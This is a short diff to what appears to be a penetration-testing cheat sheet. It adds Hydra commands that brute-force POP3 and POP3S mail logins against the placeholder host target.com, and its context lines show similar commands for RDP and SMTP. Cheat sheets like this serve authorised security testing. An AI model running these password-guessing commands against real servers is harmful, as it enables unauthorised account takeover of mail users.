@@ -41,3 +41,10 @@ hydra -l <username> -P <password list> <target> rdp
 hydra -l user@target.com -P passwords.txt smtp://target.com:587
 hydra -L users.txt -P passwords.txt smtp://target.com:587
 ```
+
+#### POP3 
+```
+hydra -l user@target.com -P passwords.txt pop3://target.com
+hydra -l user@target.com -P passwords.txt pop3s://target.com:995
+hydra -L users.txt -P passwords.txt pop3://target.com
+```
